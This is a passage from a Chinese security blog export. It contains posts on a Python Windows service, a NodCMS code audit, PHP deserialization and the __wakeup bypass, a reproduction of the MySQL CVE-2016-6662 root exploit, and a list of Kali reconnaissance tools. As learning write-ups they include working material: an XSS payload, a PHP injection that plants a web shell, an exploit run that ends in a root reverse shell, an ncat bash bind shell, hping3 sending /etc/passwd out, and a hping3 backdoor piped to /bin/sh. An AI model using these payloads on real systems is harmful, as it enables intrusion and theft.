daemon.restart() else: print 'unknown command' sys.exit(2) sys.exit(0) else: print 'usage: %s start|stop|restart' % sys.argv[0] sys.exit(2) WindowsPython程序作为Windows服务启动，需要安装pywin32包。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加windows服务'''import pythoncomimport win32serviceutilimport win32serviceimport win32eventimport servicemanagerimport socketimport osimport sysimport subprocessimport timefrom lib.function import confdealclass Daemon (win32serviceutil.ServiceFramework): _svc_name_ = "Test Service" #服务名 _svc_display_name_ = "Test Service" #服务显示名称 _svc_description_ = "Test Service ." #服务描述 def __init__(self,args): win32serviceutil.ServiceFramework.__init__(self,args) self.hWaitStop = win32event.CreateEvent(None,0,0,None) socket.setdefaulttimeout(60) def SvcDoRun(self): servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_,'')) self.monitorProcess() # 创建子进程 def monitorProcess(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): cmd = 'cd '+scriptPath+' &amp;&amp; python promain.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10) win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE) # 结束子进程 def SvcStop(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): remoteDic = confdeal.getConfRemote(scriptPath) if remoteDic: ret = os.popen('netstat -ano | findstr \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("taskkill /F /T /PID "+pidStr) else : exit() self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) win32event.SetEvent(self.hWaitStop) self.ReportServiceStatus(win32service.SERVICE_STOPPED)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) with open('C:\\filemonitor', 'w') as f: f.write(scriptPath) confdeal.initConf(scriptPath) win32serviceutil.HandleCommandLine(Daemon) 然后以下命令： 123456789101112# 安装服务python PythonService.py install# 让服务自动启动python PythonService.py --startup auto install # 启动服务python PythonService.py start# 重启服务python PythonService.py restart# 停止服务python PythonService.py stop# 删除/卸载服务python PythonService.py remove 这里我要提一下，python脚本文件调用windows api后，他的运行路径会发生变化，所以我这里把脚本路径存到了一个绝对地址的文件里，然后再取出来。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>linux</tag>
        <tag>python</tag>
        <tag>daemon</tag>
        <tag>service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php codeigniter nodcms 代码审计]]></title>
    <url>%2F2016%2F10%2F11%2Fphp-codeigniter-nodcms-audit%2F</url>
    <content type="text"><![CDATA[概述CMS代码审计还未入门，然后CI框架学的还不行，代码审计一脸懵逼。 前台反射型XSS1234567891011121314151617181920212223242526272829function search($lang)&#123; $this-&gt;preset($lang); $search_text = isset($_GET["filter"])?str_replace("'","",$this-&gt;input-&gt;get("filter")):""; //把单引号去掉 if($search_text!="")&#123; $search = explode("_",$search_text); if(count($search)!="")&#123; $limit = 20; if(isset($_GET["offset"]) &amp;&amp; is_numeric($_GET["offset"]))&#123; $offset = $_GET["offset"]; &#125;else&#123; $offset = 0; &#125; $this-&gt;data['data'] = $this-&gt;NodCMS_general_model-&gt;searchExtension($search,$limit,$offset); &#125; $this-&gt;data['search_word']=str_replace("_"," ",$search_text); $this-&gt;data['text_search']=$search; $this-&gt;data['text_replace']=array_map(function($value)&#123; return "&lt;strong&gt;".$value."&lt;/strong&gt;"; &#125;,$search); &#125;else&#123; $this-&gt;data['data'] = array(); &#125; $this-&gt;data['title']=str_replace("_"," ",$search_text); //把下划线替换为空格，并没有进行XSS过滤，直接打印出来，形成xss if(isset($_GET["ajax"]))&#123; echo $this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search_ajax',$this-&gt;data,true); &#125;else&#123; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data,''); &#125;&#125; 这里，只是去掉了单引号、下划线虽然难以进行sql注入攻击，但是XSS还是可以的。 1payload为：http://localhost:8000/en/search?filter=des&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt; 后台php 代码注入位置是修改语言的地方，其中一个URL为http://localhost:8000/admin/edit_lang_file/1/en。 先看截图： 然后上关键代码，关键地方打上注释了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687function edit_lang_file($id,$file_name)&#123; $this-&gt;data['data']=$this-&gt;NodCMS_general_admin_model-&gt;get_language_detail($id); if($this-&gt;data['data']==null || !file_exists(getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'))&#123; $this-&gt;session-&gt;set_flashdata('error', _l('URL-Request was not exists!',$this)); redirect(base_url()."admin/language"); &#125; $this-&gt;load-&gt;library('Get_lang_in_array'); $CI = new Get_lang_in_array(); //实例化Get_lang_in_array()函数 $this-&gt;data['lang_list'] = $CI-&gt;load($file_name,$this-&gt;data['data']['language_name']); //加载en_lang.php if(count($this-&gt;data['lang_list'])==0)&#123; $defaultLangFileName = strlen($file_name)==2?$_SESSION['language']['code']:$file_name; $this-&gt;data['lang_list'] = $CI-&gt;load($defaultLangFileName,$_SESSION['language']['language_name']); &#125; if(isset($_POST['data']))&#123; if ($this-&gt;session-&gt;userdata['group']==1) &#123; $post_data = $this-&gt;input-&gt;post('data'); //直接获取post值 $i=0; $fileContent = "&lt;?php\n"; foreach ($this-&gt;data['lang_list'] as $key=&gt;&amp;$val) &#123; $fileContent .= '$lang["'.$key.'"] = "'.$post_data[$i].'";'."\n"; //拼接代码 $val = $post_data[$i]; $i++; &#125; $file = getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'; if(file_exists($file))&#123; file_put_contents($file, $fileContent); // 把代码写入文件 &#125; $this-&gt;session-&gt;set_flashdata('success', _l('Edit language file successfully!',$this)); redirect(base_url()."admin/edit_lang_file/".$id.'/'.$file_name); &#125;else&#123; $this-&gt;session-&gt;set_flashdata('error', _l('This request is just fore real admin.',$this)); redirect(base_url()."admin/language"); &#125; &#125; $this-&gt;data['file_name'] = $file_name; $this-&gt;data['languages']=$this-&gt;NodCMS_general_admin_model-&gt;get_all_language(); $this-&gt;data['title'] = _l("Edit language file",$this); $this-&gt;data['page'] = "edit lang file"; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/language_edit_file',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data);&#125;function load($langfile = '', $idiom = '', $return = FALSE, $add_suffix = TRUE, $alt_path = '') &#123; $langfile = str_replace('.php', '', $langfile); if ($add_suffix == TRUE) &#123; $langfile = str_replace('_lang.', '', $langfile) . '_lang'; &#125; $langfile .= '.php'; if (in_array($langfile, $this-&gt;is_loaded, TRUE)) &#123; return; &#125; $config = &amp; get_config(); if ($idiom == '') &#123; $deft_lang = (!isset($config['language'])) ? 'english' : $config['language']; $idiom = ($deft_lang == '') ? 'english' : $deft_lang; &#125; if ($alt_path != '' &amp;&amp; file_exists($alt_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($alt_path . 'language/' . $idiom . '/' . $langfile); &#125; else &#123; $found = FALSE; foreach (get_instance()-&gt;load-&gt;get_package_paths(TRUE) as $package_path) &#123; if (file_exists($package_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($package_path . 'language/' . $idiom . '/' . $langfile); $found = TRUE; break; &#125; &#125; if ($found !== TRUE) &#123; show_error('Unable to load the requested language file: language/' . $idiom . '/' . $langfile); &#125; &#125; if (!isset($lang)) &#123; log_message('error', 'Language file contains no data: language/' . $idiom . '/' . $langfile); return; &#125; if ($return == TRUE) &#123; return $lang; &#125; $this-&gt;is_loaded[] = $langfile; //加载 en_lang.php文件，即执行代码。 $this-&gt;language = array(); $this-&gt;language = $lang; return $this-&gt;language; unset($lang); log_message('debug', 'Language file loaded: language/' . $idiom . '/' . $langfile); return TRUE;&#125; 代码比较复杂，加上对CI框架不是很了解，看的比较久。由于这里没有对post提交的参数进行任何的字符过滤，直接进行拼接，然后保存到文件。之后重新请求时，实例化了Get_lang_in_array()这个函数，而这个函数主要加载了en_lang.php这个文件，也就是执行了这个文件，形成代码注入，从而gershell。 1payload为：All"; file_put_contents('shell.php', '&lt;?php $_GET[a]($_GET[b]);?&gt;');;$t="111 shell.php文件会生成在根目录下，连菜刀就可以了。 存储型XSS和前台差不多，没有过滤就存入了数据库，造成XSS。]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>php</tag>
        <tag>codeigniter</tag>
        <tag>nodcms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 序列化以及 magic 函数]]></title>
    <url>%2F2016%2F10%2F09%2Fphp-serialize-magic%2F</url>
    <content type="text"><![CDATA[概述有时候需要把一个对象在网络上传输，为了方便传输，可以把整个对象转化为二进制串，等到达另一端时，再还原为原来的对象，这个过程称之为也叫序列化。 有两种情况我们必须把对象也叫序列化，第一种情况就是把一个对象在网络中传输的时候要将对象也叫序列化，第二种情况就是把对象写入文件或是数据库的时候用到也叫序列化。 串行化有两个过程，一个是序列化，就是把对象转化为二进制的字符串，我们使用serialize()函数来序列化一个对象，另一个是反序列化，就是把对象转化的二进制字符串再转化为对象， 我们使用unserialize()函数来反序列化一个对象。 详情1234567891011121314151617181920212223242526&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20my friends has Alice Jhon . 至于序列化语法解析，看如下代码： 1234567891011121314151617181920&lt;?phperror_reporting(7);class Person&#123; public $name; private $age; protected $friends; var $job; function __construct($name = "Bob", $age = 20,$friends =array("Alice","Jhon") ,$job=Null) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; $this-&gt;job = $job; &#125;&#125;$p1 = new Person();$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2?&gt; 具体输出： 1O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 需要序列化一个类的话，首先PHP会先将类名序列化。格式为 O:类名长度:”类名”:值:{} ,大致Fuzzy了下，这个类名长度前可以有%2b、%30 这些符号也可以反序列化。其他的格式可以自己对照了解。如： 1O:+6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 1O:06:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 以下是zval对应的类型和键对照表1234567891011数组中二次赋值(&amp;): R; 对象二次赋值 : r; NULL : N; true : b:1; false : b:0; Long : i; Double : d; String : s/S; Class : C; Array : a; Object : O; 可以看出变量不同的属性也有着不同的格式 123public : key; protected : *key; private : 对象名key; 魔术方法在PHP5中有两个魔术方法__sleep()方法和__wakeup()方法，在对象串行化的时候，会调用一个sleep()方法来完成一 些睡前的事情；而在重新醒来，即由二进制串重新组成一个对象的时候，则会自动调用PHP的另一个函数wakeup()，做一些对象醒来就要做的动作。sleep()函数不接受任何参数， 但返回一个数组，其中包含需要串行化的属性。末被包含的属性将在串行化时被忽略，如果没有sleep()方法，PHP将保存所有属性。当然，还有其他的魔术方法。 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __sleep() &#123; // 此时，属性$age将被删除！！！ $arr = array("name", "friends"); return($arr); &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 $this-&gt;name = "Orleven"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Orleven,my age is my friends has Alice Jhon . 不久之前刚出来的__wakeup()引发的漏洞。大意是指，当我们反序列化一个对象时，如果它的属性发生了变化，就会导致wakeup函数中不会执行，那么如果__wakeup()中存在一些重要的语句，就会导致不会被执行。 对于如下代码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . ",my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 echo "Wakeup...&lt;br/&gt;"; $this-&gt;name = "Orleven"; echo "Wakeuped&lt;br/&gt;"; &#125; function __destruct()&#123; //Do something $this-&gt;say(); echo "Destructed&lt;br/&gt;"; &#125;&#125; 如果执行如下代码：123$p1_string = 'O:6:"Person":3:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p1_string."&lt;br/&gt;";$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2 具体输出： 12345O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; Wakeup... Wakeuped I am Orleven,my age is 20,my friends has Alice Jhon . Destructed 如果执行如下代码：123$p3_string = 'O:6:"Person":4:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p3_string."&lt;br/&gt;";$p4 = unserialize($p3_string); //把一个序列化的字符串反序列化形成对象$p4 具体输出： 123O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20,my friends has Alice Jhon . Destructed 发现wakeup并没有执行。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>serialize</tag>
        <tag>magic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 提权漏洞 CVE-2016-6662]]></title>
    <url>%2F2016%2F09%2F29%2Fmysql-root-code-execution-CVE-2016-6662%2F</url>
    <content type="text"><![CDATA[概述最近出了一个mysql提权漏洞，趁热练练手。 利用前提 mysql_hookandroot_lib.c mysql拥有my.cnf写权限 mysql root用户可执行 set global general_log_file = &#39;my.cnf&#39;; sql语句 需要file权限 环境搭建安装mysql 5.6.3212345678910111213141516171819202122232425$ wget http://ftp.kaist.ac.kr/mysql/Downloads/MySQL-5.6/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz$ sudo apt-get install libaio-dev（或者libaio1） $ chmod 777 tmp$ groupadd mysql$ useradd -r -g mysql mysql$ cd /usr/local/$ tar zxvf /tmp/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz $ ln -s mysql-5.6.32-linux-glibc2.5-x86_64 mysql$ cd mysql $ chown -R mysql .$ chgrp -R mysql .$ scripts/mysql_install_db --user=mysql$ chown -R root .$ chown -R mysql data$ cp my.cnf /etc/my.cnf$ bin/mysqld_safe --user=mysql &amp;$ cp support-files/mysql.server /etc/init.d/mysql.server$ ./bin/mysqladmin -u root password '123456'$ ./bin/mysqladmin -uroot -p123456 shutdown$ bin/mysqld_safe --user=mysql &amp;# 如果想在任何地方都能直接使用mysql命令，需要设置环境变量：$ vi /etc/environment # 在PATH=“…”最后添加mysql可执行文件所在路径（在这里是:/usr/local/mysql/bin）$ source /etc/environment 版本信息123456789101112131415161718192021222324$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.4 LTSRelease: 14.04Codename: trusty$ ./bin/mysqladmin -u root -p versionEnter password: ./bin/mysqladmin Ver 8.42 Distrib 5.6.32, for linux-glibc2.5 on x86_64Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Server version 5.6.32Protocol version 10Connection Localhost via UNIX socketUNIX socket /tmp/mysql.sockUptime: 2 min 54 secThreads: 1 Questions: 10 Slow queries: 0 Opens: 67 Flush tables: 1 Open tables: 60 Queries per second avg: 0.057 进程属性123$ ps -aux | grep mysqlroot 23 0.0 0.0 4440 748 ? S 10:02 0:00 /bin/sh bin/mysqld_safe --user=mysqlmysql 122 13.0 45.0 985540 457724 ? Sl 10:02 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/d1190820d670.err --pid-file=/usr/local/mysql/data/d1190820d670.pid 可以看出，mysqld_safe封装脚本是以root权限启动的，而主要的mysqld进程是用较低权限的mysql用户启动的。 复现准备修改my.cnf权限12# 将/usr/local/mysql/my.cnf$ chown mysql:mysql /usr/local/mysql/my.cnf 创建attacker用户，并赋予file，select，insert权限，创建用于实验的数据库pocdb123CREATE DATABASE pocdb;GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%'; 复现修改一下mysql_hookandroot_lib.c的ip，port和my.cnf的位置：123#define ATTACKERS_IP "192.168.0.1"#define SHELL_PORT 6033#define INJECTED_CONF "/usr/local/mysql/my.cnf" 修改一下0ldSQL_MySQL_RCE_exploit.py的port和my.cnf的位置,然后执行1$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.0.1 -dbname pocdb -mycnf /usr/local/mysql/my.cnf 执行成功后会在my.cnf里添加如下：12345678910111213/usr/local/mysql/bin/mysqld, Version: 5.6.32 (MySQL Community Server (GPL)). started with:Tcp port: 3306 Unix socket: /tmp/mysql.sockTime Id Command Argument160929 9:37:14 1 Query select "# 0ldSQL_MySQL_RCE_exploit got here :)[mysqld]malloc_lib='/usr/local/mysql/data/mysql_hookandroot_lib.so'[abyss]" INTO void 1 Query SET global general_log = off 虽然直接把日志写在my.cnf里重启mysql时会执行失败，但是不用担心,config_cleanup() 这个函数会清除这些。 重启mysql1234Listening on [0.0.0.0] (family 0, port 12344)Connection from [192.168.0.4] port 12344 [tcp/*] accepted (family 2, sport 34434)whoamiroot]]></content>
      <categories>
        <category>root code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Information Gathering]]></title>
    <url>%2F2016%2F09%2F27%2Fkali-information-gathering%2F</url>
    <content type="text"><![CDATA[概述Kali 里预装了很多安全与取证的相关工具，但是我所了解的却只有sqlmap、msf、nmap等少数几个，对于其他的却并没过多关注。于是今天想着整理一下Kali有关信息收集的工具，便于以后备查。 信息收集acccheck：描述：该工具被设计为一个密码字典攻击的工具，目标Windows身份验证通过SMB协议。 ace：描述：不明。 amap：描述：一个服务器枚举工具，使用这个工具可以识别正运行在一个指定端口或一个范围端口上的应用程序。用法：1$ amap -bq 192.168.1.110 1-1000 Automater描述：automater是分析URL的域名，IP地址，和MD5哈希OSINT工具。用法：12$ automater baidu.com$ automater -s robtex 50.116.53.73 braa描述：一个SNMP的扫描工具用法：1$ braa public@192.168.0.1:.1.3.6.* casefile描述：服务枚举：如DNS枚举用法：1$ casefile cdpsnarf描述：网络嗅探器，从CDP数据包中提取信息用法：1$ cdpsnarf -i eth0 -w cdpsnarf.pcap cisco-torch描述：快速发现远程Cisco的主机上运行Telnet、SSH、WEB、SNMP服务和启动NTP和字典攻击的服务发现。用法：1$ cisco-torch -A 192.168.99.202 copy-router-config描述：从思科设备上运行的SNMP拷贝配置文件。用法：1$ copy-router-config.pl 192.168.1.1 192.168.1.15 private dmitry描述：收集可能的子域，电子邮件地址，正常运行时间的信息，TCP端口扫描，查找，和更多。用法：1$ dmitry baidu.com dnmap描述：DNmap是一款基于Nmap的分布式框架，使用客户端/服务端架构，服务器接收命令并发送至客户端进行Nmap安全扫描，扫描完毕后，客户端返回扫描结果。用法：12345678# dnmap_server：$ echo "nmap -F 192.168.1.0/24 -v -n -oA sub1" &gt;&gt; dnmap.txt$ echo "nmap -F 192.168.0.0/24 -v -n -oA sub0" &gt;&gt; dnmap.txt$ dnmap_server -f dnmap.txt# dnmap_client：# (dnmap_server的ip)(dnmap_client的别名)$ dnmap_client -s 192.168.1.15 -a dnmap-client1 dnsenum描述：枚举域DNS信息和发现不连续的IP模块。用法：1$ dnsenum --noreverse -o mydomain.xml example.com dnsmap描述：枚举域DNS信息。用法：1$ dnsmap example.com -w /usr/share/wordlists/dnsmap.txt dnsrecon描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml dnstracer描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnstracer -r 3 -v example.com dnswalk描述：DNS的调试器。它执行特定区域的区域传输，并检查数据库在许多方面的内部一致性，以及准确性。用法：12$ dnswalk example.com.$ dnswalk -r -d example.com. dotdotpwn.pl描述:测试发现软件例如HTTP、FTP、TFTP服务器遍历目录的漏洞，网络平台如CMS、ERP、博客等。用法：1$ dotdotpwn.pl -m http -h 192.168.1.1 -M GET enum4linux描述:枚举Windows主机和Samba 主机。用法：1$ enum4linux -U -o 192.168.1.200 enumiax描述: Inter Asterisk Exchange 协议 的用户名蛮力枚举。 enumiax可能在两种不同的模式操作； 顺序用户名猜测或字典攻击。用法：1$ enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1 Fierce描述: ip 扫描器用法：1$ fierce -dns example.com fragroute描述: fragroute能够截取、修改和重写向外发送的报文，实现大部分在了Secure Networks Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection中叙述的IDS欺骗技术，包括IP、TCP层的数据包碎片以及数据包数据重叠等。用法：12345# fragroute：$ fragroute 192.168.1.123# fragtest ：$ fragtest ip-tracert frag-new 192.168.1.123 ghost-phisher描述: 是无线和以太网的安全审计和攻击软件用法：1$ ghost-phisher GoLismero描述: web漏洞扫描用法：1234567891011121314# 扫描一个网站，并显示在屏幕上的结果:$ golismero scan http://www.0535code.com# 获取nmap结果，扫描发现所有主机写HTML报告:$ golismero scan -i nmap_output.xml -o report.html# 获取结果OpenVAS和它们显示在屏幕上，但不扫描任何东西:$ golismero import -i openvas_output.xml# 显示所有可用配置文件的列表:$ golismero profiles# 显示所有可用插件的列表:$ golismero plugins# 显示所有信息和插件:$ golismero info brute_*# 从以前的扫描中转储数据库:$ golismero dump -db example.db -o dump.sql hping3描述: hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。用法：1234567891011121314151617# 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。$ hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10# 端口扫描$ hping3 -I eth0 -S 192.168.10.1 -p 80# 对目标机发起大量SYN连接$ hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000# 文件传输 # 接收端： $ hping3 192.168.1.159 --listen signature --safe --icmp # 发送端： $ hping3 192.168.1.108 --icmp -d 100 --sign signature --file /etc/passwd# 木马功能 # 被控制端： $ hping3 127.0.0.1 --listen signature --safe --udp -p 12345 | /bin/sh # 控制端： $ echo ls &gt; test.cmd $ hping3 127.0.0.1 -p 12345 -d 100 --udp --sign signature --file ./test.cmd intrace描述:InTrace 是一个类似 traceroute 的应用，用户可以针对已建立的 TCP 连接跟踪其 IP 的跳跃。用法:1$ intrace -h www.example.com -p 80 -s 4 lbd描述:检测是否一个给定的域使用DNS或HTTP负载平衡（通过服务器：日期：服务器响应头和之间的差别）。用法:1$ lbd example.com maltego描述:收集DNS信息等。用法:1$ maltego masscan描述:快速的端口扫描工具。用法:123456# 扫描202.203.122.122的80端口，速率为10Kpps$ masscan -p 80 202.203.122.122 --rate=10000 # 扫描202.203.122.122的0-8100的端口，扫描结果输出到output.txt（二进制）（--banners选项值旗标，或者指纹）$ masscan -p 0-8100 202.203.122.122 --banners -oB output.txt # 打开显示模式，读取output.txt中的数据，并以xml的格式写到2.txt中$ masscan --open --banners --readscan output.txt -oX 2.txt Miranda描述:操作系统探测工具。用法:1234567# 打开网卡eth0$ miranda -v -i eth0 # 自动搜索upnp主机 upnp&gt; msearch upnp&gt; host list # 查看该主机的upnp设备列表 upnp&gt; host get [index] nmap描述:网络探测工具和安全/端口扫描器。用法:123456789101112131415161718192021222324252627$ Nmap [ 扫描类型 ... ] [ 通用选项 ] &#123; 扫描目标说明 &#125;$ nmap -v -A -sV 192.168.1.1# 全面扫描：$ nmap -T4 -A targetip# 主机发现：$ nmap -T4 -sn targetip# 端口扫描：$ nmap -T4 targetip# 服务扫描：$ nmap -T4 -sV targetip# 操作系统扫描：$ nmap -T4 -O targetip# SYN扫描:$ nmap -sS -T4 targetip# FIN扫描:$ nmap -sF -T4 targetip# ACK扫描:$ nmap -sA -T4 targetip# UDP扫描:$ NMAP -sU targetip# 漏洞扫描：$ nmap -sS -sV --script=vulscan/vulscan.nse target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target$ nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target$ nmap -sV --script=vuln target$ nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target nping描述:网络数据包生成工具/平实用程序。用法:1$ nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1 ndiff描述:实用工具Nmap扫描的结果比较。用法:1$ ndiff yesterday.xml today.xml ncat描述:连接和重定向的套接字。用法:1$ ncat -v --exec "/bin/bash" --allow 192.168.1.123 -l 4444 --keep-open p0f描述:是一款被动探测工具,通过分析网络数据包来判断操作系统用法:1$ p0f -i eth0 -p -o /tmp/p0f.log Recon-ng描述:与msf类似，Recon-ng框架是一个强大的工具，使用它可以自动的收集信息和网络侦查。用法:1234567891011121314151617$ recon-ng # 查看所有命令： [recon-ng][default]&gt; help # 查看所有有效的模块列表： [recon-ng][default]&gt; show modules # 使用recon/domains-hosts/baidu_site模块，枚举baidu网站的子域： [recon-ng][default]&gt; use recon/domains-hosts/baidu_site # 查看该模块下可配置选项参数： [recon-ng][default][baidu_site]&gt; show options # 配置SOURCE选项参数： [recon-ng][default][baidu_site]&gt; set SOURCE baidu.com # 启动信息收集： [recon-ng][default][baidu_site]&gt; run # 查看获取的数据： [recon-ng][default]&gt; use reporting/csv # 创建报告： 